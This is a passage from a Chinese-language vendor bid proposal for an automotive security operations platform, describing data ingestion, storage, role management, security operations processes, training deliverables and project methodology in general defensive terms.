title="日志导出模块："></a>日志导出模块：</h6><p>有权限用户的日志导出：系统支持有权限的用户进行日志导出操作。导出的日志包含风险事件等级、类型、状态、关联资产信息、资产IP等相关信息。具体设计如下。</p><ul><li>.导出设置界面：</li></ul><p>选择导出条件：提供一个导出设置界面，允许用户选择导出的条件，包括风险事件等级、类型、状态等。使用直观的界面元素，如下拉菜单、多选框等。</p><p>字段选择器：提供字段选择器，让用户可以选择导出的字段，包括关联资产信息、资产IP等。允许用户根据需要定制导出的信息。</p><ul><li>导出操作处理：</li></ul><p>后端服务：在后端服务中实现导出操作的处理逻辑，根据用户设置的条件生成相应的查询语句。使用合适的数据库查询语言，如SQL，进行数据检索。</p><p>数据导出：将查询结果导出为用户选择的格式，如CSV、Excel等。</p><p>考虑实现异步导出，避免导出大量数据时对系统性能的影响。</p><h5 id="配置管理"><a href="#配置管理" class="headerlink" title="配置管理"></a>配置管理</h5><p>配置管理：管理系统的配置参数和设置。</p><h6 id="角色管理与权限控制模块："><a href="#角色管理与权限控制模块：" class="headerlink" title="角色管理与权限控制模块："></a>角色管理与权限控制模块：</h6><p>有效可控的角色管理：系统支持对角色进行有效可控的管理，包括角色的编辑、新增、删除和查看等操作。</p><p>系统账户安全性验证：系统提供系统账户的安全性验证功能，包括双因子认证、账户登录设置、可信主机等设置。用户可以对登录异常账户进行锁定，设置密码长度、密码强度、登录会话并发数等安全设置。</p><p>用户角色管理：系统支持用户角色管理，管理员可以为不同角色赋予不同的系统功能模块和数据的读写权限。</p><p>创建角色与权限赋予：管理员可以通过创建角色，并为角色赋予不同功能模块的权限，实现对用户的权限管理。具体设计如下。</p><ul><li>角色定义：设计系统中需要的角色，如管理员、普通用户、审计员等。</li></ul><p>为每个角色定义具体的权限范围，包括系统功能模块和数据的读写权限。</p><p>提供管理员界面，允许管理员对角色进行编辑、新增、删除等操作。确保删除角色时处理好相关的用户关联关系，避免数据不一致。</p><ul><li>权限控制：在系统的各个模块中实现权限控制，确保只有具有相应权限的用户可以进行相关操作。4. 创建角色与权限赋予：</li><li>角色创建：提供管理员功能，允许管理员创建新的角色。在创建角色时，指定角色的名称和初始的权限范围。</li><li>权限赋予：在系统管理界面，允许管理员为每个角色赋予不同功能模块的权限。提供直观的权限赋予界面，以方便管理员进行设置。</li></ul><h4 id="大数据引擎"><a href="#大数据引擎" class="headerlink" title="大数据引擎"></a>大数据引擎</h4><p>功能参数如下：</p><ul><li>支持从既有的FAW大数据平台、平台安全防护引接TSP、OTA、PKI等数据，从漏洞管理平台和安全检测平台引接漏洞数据，制定数据抽取策略，完成抽取。</li><li>支持统一数据接口，实现数据的归一化处理操作。</li><li>支持基于大数据的数据并发采集能力，实现对支持并发数据采集接收。</li><li>支持数据的格式化、去重、补全、标准化等加工操作，如有必要需对问题数据进行再清洗、再过滤，清洗完成之后入仓。</li><li>支持基于大数据的关联分析，可实现基于日志发生频次、时间、地点、车辆的分析，实现对异常数据发现。</li></ul><h5 id="外部数据对接与抽取模块："><a href="#外部数据对接与抽取模块：" class="headerlink" title="外部数据对接与抽取模块："></a>外部数据对接与抽取模块：</h5><p>支持对接既有的大数据平台、态势感知平台、平台安全防护引接TSP、PKI等数据：系统能够与这些平台进行数据对接，并制定相应的数据抽取策略，完成数据的抽取操作。</p><p>引接漏洞数据：系统支持从漏洞管理平台和安全检测平台引接漏洞数据，确保漏洞信息的及时更新。具体设计如下。</p><ul><li>. 数据抽取策略制定：</li></ul><p>数据源分析：分析既有平台的数据源结构，了解数据的组织和存储方式。</p><p>增量同步：设计增量同步策略，以提高效率，减少重复数据传输</p><p>定时任务：实现定时任务，根据数据更新频率制定抽取计划，确保数据及时同步。</p><ul><li>引接漏洞数据：</li></ul><p>漏洞数据接口：与漏洞管理平台和安全检测平台建立标准化的接口，支持漏洞数据的引接。</p><p>定期同步：实现定期同步漏洞数据的机制，确保系统中的漏洞信息保持及时更新。</p><p>异常处理：考虑引入异常处理机制，及时处理数据同步中的异常情况，确保数据的完整性。</p><ul><li>安全性和合规性：</li></ul><p>加密传输：采用加密传输方式，保障敏感数据在传输过程中的安全性。</p><p>访问控制：在数据对接的接口层面实施访问控制，确保只有授权系统能够进行数据对接。</p><h5 id="统一数据接口与归一化处理模块："><a href="#统一数据接口与归一化处理模块：" class="headerlink" title="统一数据接口与归一化处理模块："></a>统一数据接口与归一化处理模块：</h5><p>统一数据接口：系统提供统一的数据接口，实现不同数据源的数据归一化处理，确保数据格式的一致性。具体设计如下。</p><ul><li>标准化格式：制定系统数据接口的标准格式，确保数据在传输和处理过程中具有一致的结构。</li><li>RESTful API：采用RESTful API设计原则，定义资源、标准HTTP方法，以提供简洁和标准的数据接口。</li><li>数据格式标准：使用通用的数据格式标准，如JSON或XML，以便在不同系统之间进行数据传递。</li><li>数据清洗：实施数据清洗机制，对不同数据源的数据进行清理，处理不一致的格式、命名规范等问题。</li></ul><h5 id="大数据并发采集模块："><a href="#大数据并发采集模块：" class="headerlink" title="大数据并发采集模块："></a>大数据并发采集模块：</h5><p>基于大数据的数据并发采集能力：系统具备基于大数据的数据并发采集能力，可以同时处理多个数据源的数据，提高数据采集的效率和速度。数据源包含既有的FAW大数据平台、态势感知平台、平台安全防护引接TSP、OTA、PKI等数据，从漏洞管理平台和安全检测平台引接漏洞数据，制定数据抽取策略，完成抽取。具体设计如下。</p><ul><li>多数据源管理：</li></ul><p>数据源注册：允许管理员注册不同类型的数据源，包括FAW大数据平台、态势感知平台、平台安全防护引接TSP、OTA、PKI等。</p><p>数据源配置：提供界面，使管理员能够配置每个数据源的连接信息、认证信息等。</p><p>动态扩展：考虑实现数据源的动态扩展机制，以便在系统运行时添加新的数据源。</p><ul><li>数据抽取策略：</li></ul><p>增量抽取：设计增量抽取策略，确保只有变化的数据被采集，以提高效率。</p><p>定时任务：实现定时任务系统，允许管理员制定数据抽取计划，按照预定的时间进行采集。</p><p>异常处理：引入异常处理机制，能够处理在数据抽取过程中可能出现的错误，确保采集的稳定性。</p><ul><li>引接漏洞数据：</li></ul><p>漏洞数据接口：与漏洞管理平台和安全检测平台建立异步接口，以提高漏洞数据的引接效率。</p><p>批量导入：实现批量导入机制，能够一次性导入多个漏洞数据，减少导入次数。</p><h5 id="数据加工与清洗模块："><a href="#数据加工与清洗模块：" class="headerlink" title="数据加工与清洗模块："></a>数据加工与清洗模块：</h5><p>数据加工操作：系统支持对数据进行格式化、去重、补全、标准化等加工操作，确保数据的质量和一致性。</p><p>再清洗与再过滤：系统在必要时可以对问题数据进行再清洗、再过滤，以确保数据的准确性和可用性，清洗完成后将数据入仓。具体设计如下。</p><ul><li>数据加工操作设计：</li></ul><p>格式化操作：提供格式化工具，支持对数据进行格式调整，确保数据的一致性和可读性。</p><p>去重处理：实现去重算法，能够识别并删除重复的数据，避免冗余信息对分析造成影响。</p><p>补全缺失值：设计缺失值补全策略，对数据中的缺失值进行合理的填充，以确保数据的完整性。</p><p>标准化处理：提供标准化工具，能够将数据转换为统一的标准格式，以适应系统的需求。</p><ul><li>再清洗与再过滤设计：</li></ul><p>异常数据检测：实现异常数据检测机制，能够识别出问题数据，例如不规范、异常值等。</p><p>再清洗操作：提供再清洗工具，允许用户对异常数据进行再次清洗，确保数据的准确性。</p><p>再过滤策略：制定再过滤策略，能够对不符合规范的数据进行再次过滤，确保数据的可用性。</p><h5 id="基于大数据的关联分析模块："><a href="#基于大数据的关联分析模块：" class="headerlink" title="基于大数据的关联分析模块："></a>基于大数据的关联分析模块：</h5><p>关联分析能力：系统支持基于大数据的关联分析，可以根据日志发生频次、时间、地点、车辆等因素进行分析，从中发现异常数据和潜在的安全威胁。具体设计如下。</p><ul><li>定义关联数据结构：制定关联数据模型，明确定义日志中需要用于关联分析的关键因素，如时间戳、地点、车辆标识等。</li><li>数据标准化：对各个数据字段进行标准化，确保数据格式的一致性，方便后续关联分析的处理。</li><li>时间序列分析：考虑使用时间序列分析方法，发现时间上的关联性，识别异常事件的发生规律。</li><li>地理空间分析：实施地理空间分析，识别在特定地点发生的异常事件，以进行地域性的关联分析。</li></ul><h4 id="大数据存储"><a href="#大数据存储" class="headerlink" title="大数据存储"></a>大数据存储</h4><p>功能参数如下：</p><ul><li>支持车辆设备端的日志数据存储；</li><li>支持平台侧安全日志数据存储；</li><li>支持车型、设备、应急响应、漏洞库、系统管理等配置数据的存储；</li><li>支持态势数据的存储；</li><li>支持构建存储库表，实现存储，查询高效、准确，并支持灵活扩展。</li></ul><h5 id="车辆设备端日志数据存储模块："><a href="#车辆设备端日志数据存储模块：" class="headerlink" title="车辆设备端日志数据存储模块："></a>车辆设备端日志数据存储模块：</h5><p>支持车辆设备端日志数据存储：系统能够存储车辆设备端生成的日志数据，包括车辆操作记录、传感器数据等。</p><ul><li>定义数据结构：制定车辆设备端日志数据的数据模型，明确定义记录的字段，如时间戳、车辆标识、操作类型、传感器数据等。</li><li>数据标准化：对各个字段进行标准化，确保数据格式的一致性，方便后续的存储和分析。</li><li>设备端数据上传：设计设备端数据上传机制，支持车辆设备端将生成的日志数据上传至中央存储系统。</li><li>数据传输协议：使用安全可靠的数据传输协议，如HTTPS，确保数据在传输过程中的安全性。</li></ul><h5 id="平台侧安全日志数据存储模块："><a href="#平台侧安全日志数据存储模块：" class="headerlink" title="平台侧安全日志数据存储模块："></a>平台侧安全日志数据存储模块：</h5><p>支持平台侧安全日志数据存储：系统能够存储平台侧生成的安全日志数据，包括用户操作日志、系统事件日志等。具体设计如下。</p><ul><li>定义数据结构：制定平台侧安全日志数据的数据模型，明确定义记录的字段，如时间戳、用户标识、操作类型、系统事件等。</li><li>数据标准化：对各个字段进行标准化，确保数据格式的一致性，方便后续的存储和分析。</li><li>平台侧日志记录：在平台侧实施日志记录机制，记录用户操作日志、系统事件日志等。</li><li>数据上传协议：使用安全可靠的数据上传协议，确保日志数据能够安全可靠地上传至中央存储系统。</li></ul><h5 id="配置数据存储模块："><a href="#配置数据存储模块：" class="headerlink" title="配置数据存储模块："></a>配置数据存储模块：</h5><p>支持车型、设备、应急响应、漏洞库、系统管理等配置数据的存储：系统可以存储与车型、设备、应急响应、漏洞库、系统管理等相关的配置数据，以便后续的查询和使用。具体设计如下。</p><ul><li>定义配置数据结构：制定车型、设备、应急响应、漏洞库、系统管理等配置数据的数据模型，明确定义各个配置项的属性。</li><li>关联关系设计：建立各配置项之间的关联关系，确保数据之间的一致性和关联性。</li><li>选择存储引擎：根据配置数据的特性，选择合适的存储引擎，如关系型数据库、NoSQL数据库等。</li><li>数据索引优化：设计合适的索引，以加速对配置数据的查询操作。</li></ul><h5 id="态势数据存储模块："><a href="#态势数据存储模块：" class="headerlink" title="态势数据存储模块："></a>态势数据存储模块：</h5><p>支持态势数据的存储：系统能够存储与态势感知相关的数据，包括威胁情报、安全事件、攻击行为等数据，以便进行分析和展示。具体设计如下。</p><ul><li>定义态势数据结构：制定态势数据的数据模型，包括威胁情报、安全事件、攻击行为等的字段和关联关系。</li><li>标准化数据格式：对态势数据中的各个字段进行标准化，确保数据格式的一致性。</li><li>存储引擎选择：选择适合态势数据的存储引擎，例如时序数据库、图数据库等，以支持不同类型的查询和分析。</li><li>数据索引优化：设计索引以加速对态势数据的查询操作，考虑到数据量可能较大的情况。</li></ul><h5 id="存储库表构建与扩展模块："><a href="#存储库表构建与扩展模块：" class="headerlink" title="存储库表构建与扩展模块："></a>存储库表构建与扩展模块：</h5><p>构建存储库表：系统支持构建适应数据存储需求的库表结构，确保存储的高效性和准确性。</p><p>高效查询与灵活扩展：系统能够实现对存储数据的高效查询，提供快速的查询响应时间，并支持根据需求灵活扩展存储库表结构，以适应数据量和数据类型的变化。具体设计如下。</p><ul><li>数据库设计：</li></ul><p>规范化设计：采用数据库规范化设计，确保数据不冗余、一致性高，减少更新异常。</p><p>合适的数据类型：选择合适的数据类型，确保存储空间的有效利用，提高查询效率。</p><p>索引设计：设计适当的索引，以加速查询操作，但要注意过多索引可能会影响写入性能。</p><ul><li>查询优化：</li></ul><p>查询计划分析：使用数据库查询计划分析工具，优化查询语句，确保数据库引擎能够选择最优的执行计划。</p><p>适当的缓存：使用数据库缓存机制，提高频繁查询的性能，尤其对于读取较为静态的数据。</p><ul><li>灵活扩展：</li></ul><p>可扩展的架构：采用可扩展的数据库架构，如分布式数据库，以便灵活扩展存储容量和吞吐量。</p><p>动态表结构设计：考虑采用动态表结构设计，以支持根据需求动态添加字段，适应数据类型的变化。</p><h4 id="安全运营流程及规划方案"><a href="#安全运营流程及规划方案" class="headerlink" title="安全运营流程及规划方案"></a>安全运营流程及规划方案</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/6a65ef876f4ef8ba2c29a5132c78cdad.png"></p><p>我方提供了详尽的安全运营流程及规划方案，结合汽车安全运营平台，有效提升资产发现、漏洞处置以及事件运营效率。</p><h5 id="资产管理方案："><a href="#资产管理方案：" class="headerlink" title="资产管理方案："></a>资产管理方案：</h5><p>功能参数如下：</p><ul><li>运营人员结合平台资产信息，负责根据前期的资产梳理情况，形成资产列表和范围，并监控资产安全风险状态，实现对资产的脆弱性及风险评估；</li><li>安全通告工作：提供国内外威胁资讯、安全情报、漏洞预警、黑产/灰产等内容以及对应的风险缓解、根除方案；</li><li>识别资产存在的风险，对现有资产的安全等级进行分类分级。</li></ul><p>响应方案如下：</p><p>方案概述：该方案旨在有效管理和监控汽车运营中心的资产，包括平台资产信息、威胁情报、资产安全保护等；平台设备运营人员结合平台资产信息，负责根据前期的资产梳理情况，形成资产列表和范围，并监控资产安全风险状态，实现对资产的脆弱性及风险评估；同时方案提供国内外威胁资讯、安全情报、漏洞预警、黑产/灰产等内容以及对应的风险缓解、根除方案，识别资产存在的风险，对现有资产的安全等级进行分类分级等内容。</p><p>安全运营流程中针对资产管理部分的方案如下：</p><p>1. 资产梳理和列表形成：</p><p>功能参数如下：运营人员结合平台资产信息和前期的资产梳理情况，形成详细的资产列表和范围。</p><p>功能参数如下：资产列表应包括所有关键设备、系统、应用程序、网络设备和数据存储等。</p><p>功能参数如下：每个资产包含关键信息，如资产名称、所有者、位置、IP地址、操作系统、版本号等。</p><p>2. 监控资产安全风险状态：</p><p>功能参数如下：运营人员应使用合适的安全监控工具和技术，对资产进行实时监控，以发现潜在的安全风险。</p><p>功能参数如下：监控应包括漏洞扫描、入侵检测系统、日志分析等，以及实时更新资产的安全状态。</p><p>3. 脆弱性和风险评估：</p><p>功能参数如下：运营人员应定期进行脆弱性评估，使用漏洞扫描工具和安全评估方法，发现系统和应用程序中的漏洞。</p><p>功能参数如下：针对发现的漏洞，应进行风险评估，根据漏洞的严重程度和可能的影响，确定优先级和紧急性，并采取相应的修复措施。</p><p>4. 安全通告工作：</p><p>功能参数如下：运营人员应定期提供国内外的威胁资讯、安全情报、漏洞预警以及黑产/灰产等内容。</p><p>功能参数如下：提供相关的风险缓解和根除方案，以帮助各部门和团队采取适当的措施来应对威胁和漏洞。</p><p>5. 资产风险识别和分级：</p><p>功能参数如下：运营人员应识别资产存在的风险，并根据风险的严重程度和影响，对现有资产进行分类分级。</p><p>功能参数如下：分级可以基于安全等级，如高、中、低，或根据业务重要性和敏感性等因素进行分类。</p><p>功能参数如下：不同等级的资产应采取相应的安全措施和保护措施，以确保其安全性和可用性。</p><p>通过以上方案，运营人员可以有效管理和保护组织的资产，及时发现和应对安全风险，提供相关的安全通告和风险缓解方案。这些措施将帮助组织建立健全的资产管理体系，确保资产的安全和可靠性。</p><h5 id="平台事件监控方案："><a href="#平台事件监控方案：" class="headerlink" title="平台事件监控方案："></a>平台事件监控方案：</h5><p>功能参数如下：</p><ul><li>我司提供了平台事件监控方案，方案内容包含平台事件告警分析、安全分析报告输出、常态化监控机制保障、安全预警通报等工作，每条工作内容应详尽描述，并具有可落地性。</li></ul><p>响应方案如下：</p><p>平台事件监控方案内容包含平台事件告警分析、安全分析报告输出、常态化监控机制保障、安全预警通报等工作。</p><p>1. 平台事件告警分析：</p><p>功能参数如下：配置实时监控系统，对平台关键事件进行监测和检测。</p><p>功能参数如下：设定合适的告警阈值，当超过或触发阈值时，触发告警机制。</p><p>功能参数如下：实施日志分析和异常检测，以及行为分析来检测潜在的安全事件。</p><p>功能参数如下：制定告警响应流程，明确告警的处理责任和流程。</p><p>2. 安全分析报告输出：</p><p>功能参数如下：对监控到的平台事件进行深入分析，包括事件的原因、影响范围和潜在威胁。</p><p>功能参数如下：输出安全分析报告，详细描述事件的背景、分析过程、发现的问题和建议的解决方案。</p><p>功能参数如下：报告应具备可读性和可操作性，为相关团队提供明确的指导和建议。</p><p>3. 常态化监控机制保障：</p><p>功能参数如下：建立常态化监控机制，对平台进行实时、全面的监测。</p><p>功能参数如下：配置安全设备和工具，如入侵检测系统（IDS）、防火墙、漏洞扫描器等，以提高监控的效果和准确性。</p><p>功能参数如下：定期进行漏洞扫描和安全评估，发现和修复潜在的安全漏洞。</p><p>4. 安全预警通报：</p><p>功能参数如下：设立安全预警通报机制，及时向相关人员发送预警通报。</p><p>功能参数如下：预警通报包含事件的紧急程度、影响范围、可能的后果以及建议的应对措施。</p><p>功能参数如下：确保预警通报的及时性和准确性，以便相关团队能够迅速采取必要的行动。</p><p>该方案能够实际应用到平台事件监控工作中。方案的实施需要结合具体的平台特点和安全需求来进行调整和定制，以确保安全监控的有效性和可行性。</p><h5 id="平台安全运维方案："><a href="#平台安全运维方案：" class="headerlink" title="平台安全运维方案："></a>平台安全运维方案：</h5><p>功能参数如下：</p><ul><li>我司提供了平台安全运维方案：方案内容包含平台巡检工作、系统安全扫描、配置策略更新一集补丁管理内容，每项内容应详尽阐述所开展的工作。</li></ul><p>响应方案如下：</p><p>方案概述：平台安全运维主要包括平台巡检工作、系统安全扫描、配置策略更新一集补丁管理内容等。</p><p>安全运营流程中针对平台安全运维的方案如下：</p><p>1. 平台巡检工作：</p><p>功能参数如下：定期进行平台巡检，检查系统和应用程序的安全配置和运行状态。</p><p>功能参数如下：检查服务器、网络设备、数据库等各个组件的健康状态，确保其正常运行。</p><p>功能参数如下：检查安全设备和防护措施的有效性，如防火墙、入侵检测系统等。</p><p>2. 系统安全扫描：</p><p>功能参数如下：定期进行系统安全扫描，使用漏洞扫描工具对系统和应用程序进行扫描，发现潜在的安全漏洞。</p><p>功能参数如下：扫描包括操作系统、中间件、应用程序等各个层面，以及网络设备和防护设备。</p><p>功能参数如下：根据扫描结果，评估漏洞的严重程度和可能的影响，并制定相应的修复计划。</p><p>3. 配置策略更新：</p><p>功能参数如下：定期审查和更新系统和应用程序的安全配置策略，确保其符合安全标准和最佳实践。</p><p>功能参数如下：包括强密码策略、访问控制策略、日志管理策略等。</p><p>功能参数如下：更新配置时应注意业务需求和安全要求的平衡，确保系统的安全性和可用性。</p><p>4. 补丁管理：</p><p>功能参数如下：管理系统和应用程序的补丁更新，及时修补已知的安全漏洞。</p><p>功能参数如下：建立补丁管理流程，包括漏洞公告的收集、漏洞评估和补丁部署等环节。</p><p>功能参数如下：定期检查厂商发布的安全补丁，评估其重要性和适用性，并进行相应的补丁更新。</p><p>以上方案是平台安全运维的关键环节，通过巡检、扫描、配置更新和补丁管理等工作，可以及时发现和修复潜在的安全风险，提高系统和应用程序的安全性。同时，需要建立相应的流程和机制，确保工作的持续性和有效性。此外，还应密切关注安全厂商和社区发布的安全公告和威胁情报，及时采取相应的措施应对新的安全威胁。</p><h5 id="安全运营工作方案："><a href="#安全运营工作方案：" class="headerlink" title="安全运营工作方案："></a>安全运营工作方案：</h5><p>功能参数如下：</p><ul><li>我司提供了平台安全运营方案：方案内容安全运营机制、安全事件处置、资产风险及漏洞管理、安全事件及风险排查、安全运营演示等内容，每条内容都进行了尽描述，并具有可落地性。</li></ul><p>响应方案如下：</p><p>方案概述：安全运营机制、安全事件处置、资产风险及漏洞管理、安全事件及风险排查、安全运营演示等内容。</p><p>安全运营流程中针对平台安全工作的方案如下：</p><p>1. 安全运营机制：</p><p>功能参数如下：建立安全运营团队，明确团队成员的职责和权限，确保安全工作的专业性和连续性。</p><p>功能参数如下：制定安全运营策略和指南，明确安全目标和运营流程，确保安全工作的规范性和一致性。</p><p>功能参数如下：建立安全运营报告和沟通机制，定期向管理层和相关部门报告安全状况和工作进展。</p><p>2. 安全事件处置：</p><p>功能参数如下：建立安全事件响应流程，包括事件报告、调查、分类、响应和恢复等环节。</p><p>功能参数如下：配备专门的安全事件响应团队，负责快速响应和处理安全事件，减少损失和影响。</p><p>功能参数如下：建立安全事件记录和分析机制，对安全事件进行溯源和分析，提取教训和改进措施。</p><p>3. 资产风险及漏洞管理：</p><p>功能参数如下：建立资产管理流程，对平台中的关键资产进行分类、标识和管理。</p><p>功能参数如下：定期进行资产风险评估，识别潜在的安全风险和漏洞，制定相应的风险缓解措施。</p><p>功能参数如下：建立长期的漏洞管理方法和管理流程流程，比如系统漏洞扫描、系统漏洞评估、系统漏洞修复和系统漏洞验证等，及时修复系统和应用程序中的漏洞。</p><p>4. 排查安全事件和风险：</p><p>功能参数如下：定期进行安全事件和风险排查，发现潜在的安全威胁和漏洞。</p><p>功能参数如下：利用安全监控工具和技术，对系统和网络进行实时监控，及时发现异常行为和潜在攻击。</p><p>功能参数如下：建立安全事件和风险排查报告，记录排查结果和提出改进建议，促进安全工作的持续改进。</p><p>5. 安全运营演示：</p><p>功能参数如下：定期进行安全运营演示，向管理层和相关部门展示安全工作的成果和效果。</p><p>功能参数如下：演示内容包含了系统安全的监控、安全事件的处置流程、所有资产风险的管理和系统及质量漏洞管理等。</p><p>功能参数如下：通过演示，提高管理层和相关部门对安全工作的认识和支持，促进资源的投入和安全工作的推进。</p><p>以上方案是针对平台安全工作的关键环节，通过建立机制、制定流程、进行事件处置和风险管理，以及进行演示和沟通，可以有效提升平台的安全性和可靠性。同时，需要根据具体情况和业务需求进行调整和优化，确保方案的可落地性和适用性。</p><h5 id="安全处置工作方案："><a href="#安全处置工作方案：" class="headerlink" title="安全处置工作方案："></a>安全处置工作方案：</h5><p>功能参数如下：</p><p>我司提供了安全处置工作方案，方案内容包含安全弱点及事件管理、安全事件应急方案、重要时期保障工作管理等内容，每项内容应详尽描述并具备可落地性。</p><p>响应方案如下：</p><p>方案概述：该方案旨在规划和组织安全事件的处置工作，及时应对和解决安全威胁，该部分方案主要包含安全弱点及事件管理、安全事件应急方案、重要时期保障工作管理等内容。</p><p>安全运营流程中针对安全处置工作的方案如下：</p><p>1. 安全弱点及事件管理：</p><p>功能参数如下：建立安全弱点管理流程，包括安全弱点的发现、评估、分类和跟踪等环节。</p><p>功能参数如下：定期进行安全弱点扫描和评估，发现系统和应用程序中的潜在安全弱点。</p><p>功能参数如下：根据评估结果，对安全弱点进行分类和优先级排序，制定相应的修复计划和措施。</p><p>2. 安全事件应急方案：</p><p>功能参数如下：建立安全事件应急响应流程，包括事件报告、调查、分类、响应和恢复等环节。</p><p>功能参数如下：配备专门的安全事件应急团队，负责快速响应和处理安全事件，减少损失和影响。</p><p>功能参数如下：制定详细的应急响应计划，包括人员调度、资源调配、沟通协调和恢复措施等。</p><p>3. 重要时期保障工作管理：</p><p>功能参数如下：针对重要时期（如重大活动、关键业务上线等），建立保障工作管理流程。</p><p>功能参数如下：确定关键系统和业务，制定相应的保障措施和应急预案，确保安全和可用性。</p><p>功能参数如下：配备专门的保障团队，负责监控和保障关键系统和业务的安全运行。</p><p>以上方案是针对安全处置工作的关键环节，通过建立管理流程、配备专门团队、制定应急方案和保障措施，可以提高安全事件的应对效率和准确性，保障关键时期的平台安全。同时，需要根据实际情况和业务需求进行调整和优化，确保方案的可落地性和适用性。</p><p>此外，还应建立安全事件记录和分析机制，对安全事件进行溯源和分析，提取教训和改进措施。定期进行安全演练和模拟演练，检验应急响应流程和保障工作的有效性。与相关部门和合作伙伴建立紧密的沟通和合作机制，形成整体的安全防护体系。</p><h5 id="运营工作交付物："><a href="#运营工作交付物：" class="headerlink" title="运营工作交付物："></a>运营工作交付物：</h5><p>功能参数如下：</p><ul><li>我司通过持续一年的培训，每月保障5人天的培训，使客户安全运维人员应具备汽车漏洞挖掘能力，以及漏洞验证的能力需得到甲方认可。</li><li>我司通过持续一年的培训，每月保障5人天的培训人天，使客户安全运营人员能够熟练使用汽车安全运营平台，分析告警及事件的风险级别，了解运营流程，运营人员能力考核由甲方负责人开展。</li><li>我司通过持续一年的培训，每月保障5人天的培训人天，使客户安全处置人员能够对运营人员同步的告警、事件内容，进行有效的处置操作，操作有效性由甲方指定人员考核，实现安全运营事件的闭环管理。</li><li>通过上述人员能力交付内容，使安全运营人员通过汽车安全运营平台输出如下报告，我司进行全程技术支持：</li></ul><table><thead><tr><th><strong>工作名称</strong></th><th><strong>数量</strong></th><th><strong>交付内容</strong></th></tr></thead><tbody><tr><td>安全通告工作</td><td>1</td><td>《安全通告工作方案》</td></tr><tr><td>资产感知/发现工作</td><td>1</td><td>《资产发现年报》</td></tr><tr><td>应急响应</td><td>1</td><td>《应急响应预案》 《应急响应总结汇报》</td></tr><tr><td>整体汽车网络安全分析</td><td>1</td><td>《汽车整体安全总结年报》</td></tr></tbody></table><ul><li>我司详细陈述项目实施方法论。建议书中需要描述其项目管理的方法、项目组配置、质量管理和文档管理方案。</li><li>我司详细陈述对于项目实施过程的不同阶段的风险预估，以及关于风险识别，评估，控制的方法论和策略。</li><li>我司详细描述为保证系统实施质量所应承担的质量保证方案。对项目相关应用系统在功能以及性能方面所能达到的建设成果进行预估和承诺。</li></ul><p>关于达到的建设成果进行预估和承诺</p><p>我司承诺对项目相关应用系统在功能以及性能方面能达的建设成果预估如下：</p><ol><li><p>使客户安全运维人员应具备汽车漏洞挖掘能力，以及漏洞验证的能力需得到甲方认可。</p></li><li><p>使客户安全运营人员能够熟练使用汽车安全运营平台，分析告警及事件的风险级别，了解运营流程，运营人员能力考核由甲方负责人开展。</p></li><li><p>使客户安全处置人员能够对运营人员同步的告警、事件内容，进行有效的处置操作，操作有效性由甲方指定人员考核，实现安全运营事件的闭环管理。</p></li><li><p>使安全运营人员通过汽车安全运营平台输出相应报告</p><p>特此承诺！</p></li></ol><p>承诺人：浙江国利网安科技有限公司</p><ul><li>技术方案应详细描述为保证工作实施质量所应承担的质量保证方案，包含项目实施及上线中所需要的支撑和运维工作。</li></ul><p>响应方案如下：</p><p>方案概述：该方案旨在明确安全运营工作的交付物，包括报告、文档、培训材料等。</p><p>方案内容：</p><p>运营报告：定期生成安全运营报告，包括安全事件统计、漏洞修复情况、安全运营绩效等，向相关人员汇报安全运营工作的情况。</p><p>文档和手册：编写安全运营相关的文档和操作手册，包括工作指南、应急响应手册等，方便工作人员参考和使用。</p><p>培训材料：制作安全运营培训材料，包括培训课件、案例分析等，用于培训工作人员的安全意识和技能。</p><p>培训计划：</p><p>持续一年的培训：我方将提供持续一年的培训计划，每月至少保障5人天的培训时间，以培养甲安全运维人员的汽车漏洞挖掘能力和漏洞验证能力。</p><p>认可要求：培训的目标是使安全运维人员具备相关能力，并得到甲方认可。</p><p>人员能力培养：</p><p>安全运营人员能力：我方将通过持续一年的培训，每月至少保障5人天的培训时间，使甲方安全运营人员能够熟练使用汽车运营中心，分析告警和事件的风险级别，并了解运营流程。安全运营人员的能力将由甲方负责人进行考核,以实现安全运营事件的闭环管理。</p><p>报告交付内容：</p><p>通过上述人员能力交付内容，我方将提供以下报告：</p><p>安全通告工作：我方将提供《安全通告工作方案》。</p><p>资产感知/发现工作：我方将提供《资产发现年报》。</p><p>应急响应：我方将提供《应急响应预案》和《应急响应总结汇报》。</p><p>整体汽车网络安全分析：我方将提供《汽车整体安全总结年报》。</p><h6 id="项目实施方法论"><a href="#项目实施方法论" class="headerlink" title="项目实施方法论"></a>项目实施方法论</h6><p>我方将详细陈述项目实施的方法论，包括以下方面：</p><p><strong>项目管理方法</strong></p><p>项目管理方法是一种系统化的方法论，用于规划、组织、执行和控制项目的活动，以实现项目目标并交付预期结果。以下是项目管理方法的一般描述：</p><p>1. 项目目标定义：明确项目的目标和可交付成果，包括项目范围、时间、成本和质量要求等方面的约束条件。</p><p>2. 项目计划制定：制定详细的项目计划，包括工作分解结构（WBS）、进度计划、资源分配、风险管理和沟通计划等。</p><p>3. 团队组建和管理：确定项目团队成员，明确各自的角色和责任，并建立有效的沟通和协作机制来促进团队合作。</p><p>4. 进度和成本控制：监控项目的进度和成本，及时发现偏差并采取纠正措施，确保项目按计划进行并控制预算。</p><p>5. 风险管理：识别、评估和应对项目风险，制定风险管理计划，并实施风险监控和应急响应措施。</p><p>6. 沟通和利益相关者管理：建立有效的沟通渠道，与项目利益相关者保持良好的关系，并及时沟通项目的进展和变更。</p><p>7. 质量管理：制定质量管理计划，确保项目交付的成果符合质量标准，并进行质量控制和质量保证活动。</p><p>8. 变更管理：管理项目变更请求，评估变更的影响和可行性，并进行变更控制和配置管理，以确保变更的有效实施。</p><p>9. 项目评估和总结：在项目结束时进行项目评估，总结项目的成功和教训，并提出改进建议，以提高未来项目的执行效果。</p><p>这些方法可以根据具体项目的需求和特点进行调整和定制，以确保项目能够按时、按质、按成本完成，并达到预期的目标和价值。</p><p><strong>项目组配置</strong></p><p>在项目组的配置中，角色及其职责的描述：</p><p>1. 项目经理：</p><p>功能参数如下：职责：负责项目的整体规划、组织、执行和控制，确保项目按时、按质、按成本完成，并与项目利益相关者进行有效的沟通和协调。</p><p>功能参数如下：配备情况：每个项目应指定一位项目经理，具备项目管理经验和技能，能够领导和管理整个项目团队。</p><p>2. 技术人员：</p><p>功能参数如下：职责：根据项目需求，负责项目中的技术实施、开发、测试和维护工作，确保项目技术方案的实施和交付。</p><p>功能参数如下：配备情况：根据项目的技术要求，配置适当数量和类型的技术人员，包括开发人员、测试人员、系统工程师等。</p><p>3. 